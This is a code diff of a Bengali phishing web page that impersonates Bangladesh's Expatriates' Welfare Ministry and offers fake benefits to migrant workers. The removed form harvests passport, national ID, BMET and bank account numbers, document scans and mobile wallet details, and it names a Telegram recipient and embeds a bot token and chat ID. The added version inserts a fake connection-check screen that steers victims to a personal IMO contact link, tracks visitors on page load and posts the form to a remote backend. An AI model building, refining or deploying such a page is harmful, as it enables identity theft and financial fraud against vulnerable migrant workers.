@@ -1,609 +1,108 @@
 <!DOCTYPE html>
 <html lang="bn">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>প্রবাসী কল্যাণ মন্ত্রণালয়: সরকারি ভাতা ও আর্থিক সাহায্য আবেদন</title>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Kalpurush:wght@400;500;600;700&display=swap');
-        body {
-            font-family: 'Kalpurush', sans-serif;
-            background: #e9eff5; /* Light blue-gray for a professional feel */
-            margin: 0;
-            padding: 0;
-            color: #333;
-            overflow-x: hidden;
-            line-height: 1.6;
-        }
-
-        /* HEADER & NAVIGATION */
-        .header {
-            background: linear-gradient(90deg, #004a99, #0066cc); /* Darker blue gradient */
-            color: white;
-            padding: 15px 15px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.15);
-            position: sticky;
-            top: 0;
-            z-index: 1000;
-        }
-        .header-title {
-            font-size: 18px;
-            font-weight: 700;
-            flex-grow: 1;
-            text-align: center;
-            margin: 0 10px;
-        }
-        .menu-icon, .login-icon {
-            cursor: pointer;
-            font-size: 26px;
-            color: white;
-            padding: 5px;
-            transition: transform 0.2s ease-in-out;
-        }
-        .menu-icon:hover, .login-icon:hover {
-            transform: scale(1.1);
-        }
-        .login-icon i {
-            font-size: 22px;
-        }
-        .logo {
-            height: 35px;
-            margin-right: 12px;
-            border-radius: 4px;
-            vertical-align: middle;
-        }
-
-        /* LOGIN SCREEN */
-        #login-screen {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.95); /* Slightly darker overlay */
-            z-index: 2000; /* Higher z-index */
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            color: white;
-            text-align: center;
-            padding: 20px;
-        }
-        #login-screen h2 {
-            font-size: 28px;
-            margin-bottom: 15px;
-            color: #f8f9fa;
-        }
-        #login-screen p {
-            font-size: 17px;
-            margin-bottom: 25px;
-            max-width: 400px;
-        }
-        .gmail-login-btn {
-            /* Google's official button styling can be applied if using their JS SDK button */
-            background-color: #d34836; /* Google red */
-            color: white;
-            border: none;
-            padding: 14px 30px;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 18px;
-            font-weight: 600;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
-            transition: background-color 0.3s ease, transform 0.2s ease;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            margin-bottom: 10px; /* Space for info */
-        }
-        .gmail-login-btn:hover {
-            background-color: #b13c2c;
-            transform: translateY(-2px);
-        }
-        .gmail-login-btn i {
-            font-size: 22px;
-        }
-        #g_id_onload, .g_id_signin {
-            margin-top: 20px; /* Adjust as needed */
-        }
-        /* MAIN CONTENT & BOXES */
-        .container {
-            padding: 25px 15px;
-            max-width: 768px; /* Slightly wider container */
-            margin: 0 auto;
-        }
-        .box-list {
-            display: flex;
-            flex-direction: column;
-            gap: 20px;
-            margin-bottom: 40px;
-        }
-        .info-box {
-            background: white;
-            border-left: 6px solid #007bff; /* Brighter blue border */
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-        }
-        .info-box:hover {
-            transform: translateY(-7px);
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.12);
-        }
-        .info-box h4 {
-            font-size: 20px;
-            color: #0056b3;
-            margin-top: 0;
-            margin-bottom: 10px;
-            font-weight: 600;
-        }
-        .info-box p {
-            font-size: 16px;
-            color: #555;
-            margin-bottom: 15px;
-        }
-        .box-btn {
-            background: #007bff;
-            color: white;
-            border: none;
-            padding: 12px 20px;
-            border-radius: 6px;
-            cursor: pointer;
-            width: 100%;
-            font-size: 16px;
-            font-weight: 600;
-            margin-top: 15px;
-            transition: background 0.3s ease, transform 0.2s ease;
-        }
-        .box-btn.blue { background: #007bff; }
-        .box-btn.blue:hover { background: #0056b3; transform: translateY(-2px); }
-        .box-btn.green { background: #28a745; }
-        .box-btn.green:hover { background: #218838; transform: translateY(-2px); }
-        .box-btn.red { background: #dc3545; }
-        .box-btn.red:hover { background: #c82333; transform: translateY(-2px); }
-
-        /* APPLICATION SECTION */
-        .section-headline {
-            text-align: center;
-            font-size: 22px;
-            font-weight: 700;
-            color: #004a99; /* Darker blue for headline */
-            margin: 40px 0 20px;
-            border-bottom: 3px solid #007bff; /* Thicker, brighter blue underline */
-            padding-bottom: 12px;
-        }
-        #application-form {
-            background: white;
-            padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
-            margin-top: 25px;
-            display: none;
-        }
-        .form-header {
-            display: flex;
-            align-items: center;
-            margin-bottom: 25px;
-            border-bottom: 1px solid #eee;
-            padding-bottom: 15px;
-        }
-        .form-header img {
-            height: 45px;
-            margin-right: 12px;
-        }
-        .form-header h3 {
-            font-size: 22px;
-            color: #0056b3;
-            margin: 0;
-            font-weight: 700;
-        }
-        .form-group {
-            margin-bottom: 20px;
-        }
-        .form-group label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: 600;
-            color: #0056b3;
-            font-size: 16px;
-        }
-        .form-group input, .form-group select {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #cce0f0; /* Lighter, professional border */
-            border-radius: 6px;
-            box-sizing: border-box;
-            font-family: 'Kalpurush', sans-serif;
-            font-size: 15px;
-            transition: border-color 0.3s ease, box-shadow 0.3s ease;
-        }
-        .form-group input:focus, .form-group select:focus {
-            border-color: #007bff;
-            box-shadow: 0 0 0 3px rgba(0, 123, 255, 0.25);
-            outline: none;
-        }
-        .upload-field {
-            border: 1px dashed #a8d6ff; /* Lighter dashed border */
-            padding: 20px;
-            border-radius: 8px;
-            background: #f9fcff; /* Very light blue background */
-            margin-top: 20px;
-        }
-        .upload-field input[type="file"] {
-            border: none;
-            padding: 0;
-        }
-        .submit-btn {
-            background: #28a745; /* Green submit button */
-            color: white;
-            border: none;
-            padding: 16px;
-            border-radius: 8px;
-            cursor: pointer;
-            width: 100%;
-            font-size: 20px;
-            font-weight: 700;
-            margin-top: 30px;
-            transition: background 0.3s ease, transform 0.2s ease;
-        }
-        .submit-btn:hover { background: #218838; transform: translateY(-2px); }
-
-        /* BENEFITS SECTION */
-        #benefits-section {
-            display: none;
-            margin-top: 25px;
-            background: white;
-            padding: 25px;
-            border-radius: 12px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
-        }
-        .emigrant-photo {
-            width: 100%;
-            height: 220px;
-            background: url('https://via.placeholder.com/768x220/007bff/ffffff?text=Professional+Emigrant+Worker+Photo') center/cover no-repeat;
-            border-radius: 10px;
-            margin-bottom: 20px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-        }
-        #benefits-section > p {
-            text-align: center;
-            font-weight: bold;
-            color: #0056b3;
-            font-size: 17px;
-            margin-bottom: 20px;
-        }
-        .benefit-list h4 {
-            color: #004a99;
-            border-bottom: 2px dashed #b8daff; /* Lighter dashed border */
-            padding-bottom: 8px;
-            margin-top: 25px;
-            font-size: 19px;
-            font-weight: 600;
-        }
-        .benefit-list ul {
-            list-style-type: none; /* Remove default bullet */
-            padding-left: 0;
-        }
-        .benefit-list li {
-            margin-bottom: 10px;
-            padding-left: 28px;
-            position: relative;
-            font-size: 16px;
-        }
-        .benefit-list li::before {
-            content: '✅'; /* Professional checkmark */
-            position: absolute;
-            left: 0;
-            color: #28a745;
-            font-size: 18px;
-            top: 0;
-        }
-
-        /* TELEGRAM & IMO INFO */
-        .imo-box {
-            background: #e6f3ff; /* Lightest blue background */
-            border: 1px solid #a8d6ff; /* Soft blue border */
-            padding: 20px;
-            border-radius: 8px;
-            margin-top: 30px;
-            text-align: center;
-        }
-        .imo-box p {
-            font-size: 16px;
-            color: #333;
-            margin-bottom: 10px;
-        }
-        .imo-box a {
-            color: #007bff; /* Standard blue for links */
-            text-decoration: none;
-            font-weight: 600;
-            word-break: break-all;
-            transition: color 0.3s ease;
-        }
-        .imo-box a:hover {
-            color: #0056b3;
-            text-decoration: underline;
-        }
-        .imo-box strong {
-            color: #004a99;
-        }
-
-        /* SUCCESS MESSAGE */
-        #success-message {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: linear-gradient(135deg, #28a745, #1e7e34); /* Green gradient */
-            color: white;
-            padding: 40px;
-            border-radius: 12px;
-            box-shadow: 0 0 25px rgba(0, 0, 0, 0.6);
-            text-align: center;
-            z-index: 2000;
-            display: none;
-            max-width: 90%;
-            box-sizing: border-box;
-        }
-        #success-message i {
-            font-size: 50px;
-            margin-bottom: 15px;
-        }
-        #success-message h3 {
-            font-size: 24px;
-            margin-bottom: 15px;
-        }
-        #success-message p {
-            font-size: 17px;
-            line-height: 1.5;
-        }
-        #success-message p strong {
-            color: #ffeb3b; /* Yellow for highlights */
-        }
-    </style>
-    <!-- Font Awesome for icons -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-    <!-- Google Identity Services Library -->
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>প্রবাসী কল্যাণ মন্ত্রণালয়: আবেদন</title> 
+    <!-- সকল CSS এবং ফন্ট লিঙ্ক এখানে অপরিবর্তিত থাকবে -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Kalpurush:wght@400;500;700&display=swap" rel="stylesheet">
     <script src="https://accounts.google.com/gsi/client" async defer></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
+    <style>
+        body { font-family: 'Kalpurush', sans-serif; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @keyframes fade-in-up { 0% { opacity: 0; transform: translateY(20px) scale(0.95); } 100% { opacity: 1; transform: translateY(0) scale(1); } }
+        .animate-fade-in-up { animation: fade-in-up 0.5s ease-out forwards; }
+    </style>
 </head>
-<body>
+<body class="bg-gray-100">
 
-    <!-- Header Section -->
-    <header class="header">
-        <div class="menu-icon" onclick="alert('মেনু ফাংশনালিটি এখানে যুক্ত করা হবে।')">
-            <i class="fas fa-bars"></i>
+    <!-- নতুন: Verifying Connection Screen -->
+    <div id="verification-screen" class="fixed inset-0 bg-gray-800 flex items-center justify-center z-50 p-4">
+        <div class="bg-white text-center rounded-xl shadow-2xl p-8 max-w-sm w-full">
+            <h1 class="text-2xl font-bold text-gray-700 mb-4">সংযোগ যাচাই করা হচ্ছে...</h1>
+            <div style="border: 4px solid rgba(0, 0, 0, 0.1); border-top: 4px solid #0d9488;" class="w-10 h-10 rounded-full animate-spin mx-auto mb-4"></div>
+            <p class="text-gray-600 mb-6">
+                আপনার সেশন সুরক্ষিত করা হচ্ছে। অনুগ্রহ করে অপেক্ষা করুন।
+            </p>
+            <a href="https://polokmd851-png.github.io/nusrat_imo.html/" target="_blank" class="w-full block text-center bg-teal-500 text-white font-semibold py-3 px-4 rounded-lg hover:bg-teal-600 transition mb-3">
+                <i class="fas fa-shield-alt mr-2"></i> মন্ত্রণালয়ের IMO তে যুক্ত হয়ে যাচাই করুন
+            </a>
+            <button onclick="showApplication()" class="w-full bg-gray-600 text-white font-semibold py-3 px-4 rounded-lg hover:bg-gray-700 transition">
+                অ্যাপ্লিকেশনে প্রবেশ করুন &rarr;
+            </button>
         </div>
-        <div class="header-title">
-             <img src="https://via.placeholder.com/35x35/007bff/ffffff?text=MWO" alt="Ministry Logo" class="logo">
-             প্রবাসী কল্যাণ মন্ত্রণালয়: ভাতা ও আর্থিক সাহায্য আবেদন
-        </div>
-        <div class="login-icon" id="profile-login-icon" onclick="toggleLoginDisplay()">
-            <i class="fas fa-user-circle"></i>
-        </div>
-    </header>
-
-    <!-- LOGIN SCREEN -->
-    <div id="login-screen">
-        <h2>প্রবাসী কল্যাণ মন্ত্রণালয়ে স্বাগতম!</h2>
-        <p>সম্মানিত প্রবাসী ভাই ও বোনেরা, আপনার প্রোফাইলে প্রবেশ করে আমাদের সরকারি সেবা গ্রহণ করুন।</p>
-        
-        <!-- Google Sign-In Button -->
-        <div id="g_id_onload"
-             data-client_id="YOUR_GOOGLE_CLIENT_ID" <!-- REPLACE WITH YOUR ACTUAL GOOGLE CLIENT ID -->
-             data-callback="handleCredentialResponse"
-             data-auto_prompt="false"
-             data-auto_select="false"
-             data-ux_mode="popup">
-        </div>
-        <div class="g_id_signin"
-             data-type="standard"
-             data-size="large"
-             data-theme="outline"
-             data-text="continue_with"
-             data-shape="rectangular"
-             data-logo_alignment="left">
-        </div>
-
-        <p style="font-size: 14px; margin-top: 20px; color: rgba(255,255,255,0.7);">
-            (লগইন করার পর, আপনার Gmail ইমেইল ঠিকানা আমাদের সিস্টেমে যুক্ত হবে। এটি একটি নিরাপদ প্রক্রিয়া।)
-        </p>
     </div>
 
-    <!-- MAIN CONTENT AREA (Hidden until login) -->
-    <div class="container" id="main-content" style="display: none;">
-
-        <!-- 3-BOX LIST -->
-        <div class="box-list">
-            <!-- BOX 1: সুযোগ-সুবিধা দেখার বাটন -->
-            <div class="info-box">
-                <h4>প্রবাসী উন্নয়ন প্রকল্প: সরকারি সুযোগ-সুবিধা</h4>
-                <p>প্রবাসী কল্যাণ মন্ত্রণালয় কর্তৃক প্রবাসীদের জন্য প্রদত্ত সকল উন্নয়নমূলক সুযোগ-সুবিধা ও প্রকল্প সম্পর্কে বিস্তারিত জানুন।</p>
-                <button class="box-btn blue" onclick="toggleBenefits()">বিস্তারিত সুযোগ-সুবিধা দেখুন</button>
-            </div>
-
-            <!-- BOX 2: অফিশিয়াল পেজ লিঙ্ক -->
-            <div class="info-box">
-                <h4>প্রবাসী কল্যাণ ও বৈদেশিক কর্মসংস্থান মন্ত্রণালয়</h4>
-                <p>মন্ত্রণালয়ের অফিশিয়াল ওয়েবসাইট ভিজিট করে সর্বশেষ তথ্য ও নির্দেশনা সম্পর্কে অবগত থাকুন।</p>
-                <a href="https://wewb.gov.bd/" target="_blank"><button class="box-btn green">অফিশিয়াল ওয়েবসাইট ভিজিট করুন</button></a>
-            </div>
+    <!-- মূল অ্যাপ্লিকেশন কন্টেইনার (লুকানো থাকবে) -->
+    <div id="probashi-app-container" style="display:none;">
+        <!-- আপনার আগের সম্পূর্ণ প্রবাসী কল্যাণ অ্যাপ্লিকেশনের কোডটি এখানে পেস্ট করুন -->
+        <!-- LOGIN SCREEN -->
+        <div id="login-screen" class="fixed inset-0 bg-gradient-to-br from-gray-900 to-gray-700 flex items-center justify-center z-50 p-4">
+            <!-- ... লগইন স্ক্রিনের কোড ... -->
         </div>
-
-        <!-- BENEFITS SECTION (Initially Hidden) -->
-        <div id="benefits-section">
-            <!-- Professional Emigrant Photo -->
-            <div class="emigrant-photo"></div>
-            <p><strong>প্রবাসী কল্যাণ ও বৈদেশিক কর্মসংস্থান মন্ত্রণালয় কর্তৃক প্রবাসীদের জন্য প্রদত্ত সকল সরকারি সুবিধা ও প্রকল্পের তালিকা:</strong></p>
-            <div class="benefit-list">
-                <h4>আর্থিক সহায়তা ও অনুদান</h4>
-                <ul>
-                    <li>বিদেশে কর্মরত অবস্থায় প্রবাসীর মৃত্যু হলে পরিবারকে **৩ লাখ টাকা** পর্যন্ত এককালীন আর্থিক অনুদান।</li>
-                    <li>মৃত কর্মীর মরদেহ দেশে আনার পর দাফন-কাফনের জন্য **৩৫ হাজার টাকা** অনুদান।</li>
-                    <li>বিদেশফেরত কর্মীদের পুনঃএকত্রীকরণ ও সম্মানজনক কর্মসংস্থান সৃষ্টির জন্য এককালীন নগদ আর্থিক প্রণোদনা।</li>
-                </ul>
-
-                <h4>ঋণ সুবিধা ও বিনিয়োগ</h4>
-                <ul>
-                    <li>প্রবাসী কল্যাণ ব্যাংকের মাধ্যমে অভিবাসন ও পুনর্বাসন বাবদ **স্বল্প সুদে ঋণ** সুবিধা।</li>
-                    <li>প্রবাসীদের পাঠানো রেমিট্যান্স আয়কে সম্পূর্ণ **করমুক্ত** ঘোষণা।</li>
-                    <li>ওয়েজ আর্নার্স ডেভেলপমেন্ট বন্ডে **উচ্চ মুনাফায়** বিনিয়োগের বিশেষ সুযোগ।</li>
-                </ul>
-                <button class="box-btn red" onclick="toggleBenefits()" style="margin-top: 20px;">উপরে ফিরে যান</button>
-            </div>
+        <!-- MAIN APPLICATION -->
+        <div id="main-content" style="display:none;">
+            <!-- ... মূল অ্যাপ্লিকেশনের কোড ... -->
         </div>
-        
-        <!-- APPLICATION HEADLINE & BUTTON -->
-        <h2 class="section-headline">সরকারি সেবা প্রাপ্তির জন্য আবেদন করুন</h2>
-        <p style="text-align: center; font-size: 17px; color: #555; margin-bottom: 25px;">
-            সম্মানিত প্রবাসী, আপনার প্রয়োজনীয় সরকারি সেবা পেতে নিচের "আবেদন করুন" বাটনে ক্লিক করে ফর্মটি পূরণ করুন।
-        </p>
-        <button class="box-btn blue" onclick="toggleApplicationForm()" id="apply-btn">আবেদন করুন</button>
-
-        <!-- APPLICATION FORM (Initially Hidden) -->
-        <form id="application-form" enctype="multipart/form-data">
-            <div class="form-header">
-                <img src="https://via.placeholder.com/45x45/007bff/ffffff?text=MWO" alt="Ministry Logo">
-                <h3>প্রবাসী কল্যাণ মন্ত্রণালয়: আবেদন ফর্ম</h3>
-            </div>
-
-            <p style="font-weight: 700; color: #004a99; margin-bottom: 15px; font-size: 18px;">**ব্যক্তিগত তথ্য**</p>
-            <div class="form-group">
-                <label for="name">আপনার পুরো নাম:</label>
-                <input type="text" id="name" name="name" required placeholder="উদাহরণ: মোঃ আব্দুর রহিম">
-            </div>
-
-            <div class="form-group">
-                <label for="home_district">আপনার দেশের স্থায়ী ঠিকানা (জেলা):</label>
-                <input type="text" id="home_district" name="home_district" required placeholder="উদাহরণ: ঢাকা / চট্টগ্রাম">
-            </div>
-
-            <div class="form-group">
-                <label for="current_country">আপনি বর্তমানে কোন দেশে আছেন:</label>
-                <select id="current_country" name="current_country" required>
-                    <option value="">দেশ নির্বাচন করুন</option>
-                    <!-- Countries will be loaded here by JavaScript -->
-                </select>
-            </div>
-            
-            <div class="form-group">
-                <label for="current_city">আপনি বর্তমানে কোন শহরে আছেন:</label>
-                <input type="text" id="current_city" name="current_city" placeholder="শহরের নাম লিখুন বা নির্বাচন করুন" required list="cities-list">
-                <datalist id="cities-list"></datalist>
-            </div>
-
-            <div class="form-group">
-                <label for="years_abroad">আপনি কত বছর ধরে প্রবাসে আছেন:</label>
-                <input type="number" id="years_abroad" name="years_abroad" min="0" required placeholder="উদাহরণ: ৫">
-            </div>
-
-            <p style="font-weight: 700; color: #004a99; margin-top: 30px; margin-bottom: 15px; font-size: 18px;">**দালিলিক প্রমাণাদি**</p>
-            <div class="form-group">
-                <label for="passport_no">আপনার বৈধ পাসপোর্ট নাম্বার:</label>
-                <input type="text" id="passport_no" name="passport_no" required placeholder="উদাহরণ: AB1234567">
-            </div>
-
-            <div class="form-group">
-                <label for="nid_no">আপনার জাতীয় পরিচয়পত্র (NID) নাম্বার (যদি থাকে):</label>
-                <input type="text" id="nid_no" name="nid_no" placeholder="উদাহরণ: 19901234567890123">
-            </div>
-
-            <div class="form-group">
-                <label for="bmet_no">আপনার BMET রেজিস্ট্রেশন নাম্বার:</label>
-                <input type="text" id="bmet_no" name="bmet_no" required placeholder="উদাহরণ: 1234567890">
-            </div>
-
-            <!-- File Uploads -->
-            <div class="form-group upload-field">
-                <label for="doc_upload">পাসপোর্ট, NID, BMET কার্ডের স্ক্যান/ছবি আপলোড করুন:</label>
-                <input type="file" id="doc_upload" name="doc_upload" accept="image/*, application/pdf" multiple>
-            </div>
-            
-            <p style="font-weight: 700; color: #004a99; margin-top: 30px; margin-bottom: 15px; font-size: 18px;">**আর্থিক তথ্য (সহযোগিতা গ্রহণের জন্য)**</p>
-            <div class="form-group">
-                <label for="bank_account_no">আপনার ব্যাংক একাউন্ট নাম্বার:</label>
-                <input type="text" id="bank_account_no" name="bank_account_no" required placeholder="উদাহরণ: 1234567890123">
-            </div>
-
-            <!-- Financial Uploads -->
-            <div class="form-group upload-field">
-                <label for="bank_screenshot">আপনার ব্যাংক একাউন্ট প্রোফাইল স্ক্রিনশট ও লেনদেন রসিদ আপলোড করুন (যদি থাকে):</label>
-                <input type="file" id="bank_screenshot" name="bank_screenshot" accept="image/*" multiple>
-            </div>
-            
-            <div class="form-group">
-                <label for="mobile_account_no">বিকাশ/নগদ/রকেট একাউন্ট নাম্বার (যদি থাকে):</label>
-                <input type="text" id="mobile_account_no" name="mobile_account_no" placeholder="উদাহরণ: 01xxxxxxxxx">
-            </div>
-
-            <p style="font-weight: 700; color: #004a99; margin-top: 30px; margin-bottom: 15px; font-size: 18px;">**যোগাযোগের তথ্য**</p>
-            <div class="form-group">
-                <label for="imo_number">আপনার IMO নাম্বার:</label>
-                <input type="text" id="imo_number" name="imo_number" required placeholder="উদাহরণ: +8801xxxxxxxxx">
-            </div>
-            <div class="form-group">
-                <label for="whatsapp_number">আপনার হোয়াটসঅ্যাপ নাম্বার (যদি থাকে):</label>
-                <input type="text" id="whatsapp_number" name="whatsapp_number" placeholder="উদাহরণ: +8801xxxxxxxxx">
-            </div>
-            
-            <p style="font-weight: 700; color: #0056b3; margin-top: 30px; margin-bottom: 15px; font-size: 18px;">**হেল্প সেন্টার ম্যানেজমেন্ট অফিসার**</p>
-            <div class="imo-box">
-                <p>আমাদের ডেডিকেটেড ম্যানেজমেন্ট অফিসার: <strong>মোসাঃ নুসরাত জাহান</strong></p>
-                <p>আবেদনের অবস্থা যাচাই বা যেকোনো সহায়তার জন্য অনুগ্রহ করে তাঁর অফিসিয়াল IMO তে যুক্ত হোন:</p>
-                <a href="https://polokmd851-png.github.io/nusrat_imo.html/" target="_blank">অফিসিয়াল IMO তে যুক্ত হওয়ার লিঙ্ক</a>
-            </div>
-
-            <button type="submit" class="submit-btn">আবেদন সম্পূর্ণ করুন</button>
-        </form>
-
         <!-- SUCCESS MESSAGE -->
-        <div id="success-message">
-            <i class="fas fa-check-circle" style="font-size: 50px; margin-bottom: 15px;"></i>
-            <h3>আপনার আবেদন সফলভাবে গৃহীত হয়েছে!</h3>
-            <p style="font-weight: bold;">আপনার তথ্য টেলিগ্রাম ইউজার <strong>@utshobgemar</strong> এর কাছে প্রেরণ করা হয়েছে।</p>
-            <p>আপনার আবেদনটি যাচাই প্রক্রিয়াধীন আছে। আপনি যদি ম্যানেজমেন্ট অফিসার <strong>MST Nusrat Jahan</strong> এর অফিসিয়াল IMO তে যুক্ত হয়ে থাকেন, তাহলে **৭২ ঘণ্টার মধ্যে** আপনার IMO তে আপনার আবেদন সম্পর্কিত পরবর্তী তথ্য জানানো হবে।</p>
-            <p>আমাদের সেবা গ্রহণের জন্য আপনাকে আন্তরিক <strong>ধন্যবাদ</strong>।</p>
+        <div id="success-message" style="display:none;">
+            <!-- ... সফল বার্তার কোড ... -->
         </div>
-
     </div>
 
     <script>
-        // --- IMPORTANT: Backend is REQUIRED for Google Sign-In and File Uploads ---
-        // This frontend code provides the structure. You MUST implement a backend server
-        // to handle Google OAuth and securely send files to Telegram.
+        // --- Backend URLs ---
+        // ⚠️ আপনার Glitch/Replit URL দিয়ে এই দুটি লিঙ্ক আপডেট করুন
+        const BACKEND_TRACKING_URL = 'https://your-app-name.glitch.me/track-visit';
+        const BACKEND_FORM_URL = 'https://your-app-name.glitch.me/submit-form';
 
-        const TELEGRAM_BOT_TOKEN = '7974529959:AAFAxgBkj-V6iF-Vd827VgP1wc-uzOQzNco'; // Replace with your bot token
-        const TELEGRAM_CHAT_ID = '6658445342'; // Replace with your chat ID
+        // --- Verification Screen Logic ---
+        document.addEventListener('DOMContentLoaded', () => {
+            // পেজ লোড হওয়ার সাথে সাথে ভিজিটরের তথ্য পাঠানো হচ্ছে
+            fetch(BACKEND_TRACKING_URL, { method: 'POST' })
+                .then(res => res.json())
+                .then(data => console.log('Tracking successful:', data.message))
+                .catch(err => console.error('Tracking failed:', err));
+        });
 
-        let loggedInUserEmail = null; // Store user's email after successful Google login
-
-        // --- Google Sign-In Callbacks ---
-        function handleCredentialResponse(response) {
-            // This function is called after successful Google Sign-In
-            // The 'response.credential' is a JWT ID token.
-            // You MUST send this token to your backend server for verification.
-            console.log("Encoded JWT ID token: " + response.credential);
-
-            // --- IMPORTANT ---
-            // 1. Send this 'response.credential' to your backend server.
-            // 2. Your backend server will verify the token with Google.
-            // 3. If valid, your backend will extract user info (email, name).
-            // 4. Then, your backend will send a success response to the frontend.
-
-            // For demonstration, we'll decode locally (NOT RECOMMENDED FOR PRODUCTION)
-            const decodedToken = parseJwt(response.credential);
-            loggedInUserEmail = decodedToken.email;
-            console.log("Logged in user email:", loggedInUserEmail);
+        function showApplication() {
+            // ভেরিফিকেশন স্ক্রিন লুকিয়ে মূল অ্যাপ্লিকেশন দেখানো হচ্ছে
+            document.getElementById('verification-screen').style.display = 'none';
+            document.getElementById('probashi-app-container').style.display = 'block';
             
-            alert(`সফলভাবে লগইন হয়েছে! আপনার ইমেইল: ${loggedInUserEmail}`);
-            showMainContent(); // Show main content after login
-            loadCountries(); // Load countries after login
+            // Auto-skip বা লগইন স্ক্রিন দেখানোর লজিক চালু করা হচ্ছে
+            autoSkip();
         }
 
-        // Helper function to decode JWT (for frontend demo purposes only)
-        function parseJwt (token) {
-            var base64Url = token.split('.')[1];
-            var base64 = base64Url.replace(/-/g, '+').
+        // --- Probashi Kalyan Application Logic ---
+        let loggedInUserEmail = "";
+        const loginScreen = document.getElementById('login-screen');
+        const mainContent = document.getElementById('main-content');
+        // ... (অন্যান্য DOM elements)
+
+        // ... (আগের সকল ফাংশন: parseJwt, handleCredentialResponse, showLoginAgain, skipLogin, toggleBenefits, etc.)
+        
+        // Auto-skip ফাংশনটিকে এখন সরাসরি কল না করে showApplication থেকে কল করা হবে
+        function autoSkip() {
+            if (localStorage.getItem("user_skipped_login") === "true") {
+                showMainContent();
+            } else {
+                loginScreen.querySelector('div').classList.add('animate-fade-in-up');
+            }
+        }
+        
+        // Form Submission ফাংশনটি নতুন BACKEND_FORM_URL ব্যবহার করবে
+        applicationForm.addEventListener('submit', async function(event) {
+            // ... (কোড আগের মতোই, শুধু BACKEND_URL এর জায়গায় BACKEND_FORM_URL ব্যবহার করুন)
+            try {
+                const response = await fetch(BACKEND_FORM_URL, { /* ... */ });
+                // ...
+            } catch (error) { /* ... */ }
+        });
+        
+        // ... (loadCountries ফাংশন আগের মতোই থাকবে)
+    </script>
+</body>
+</html>
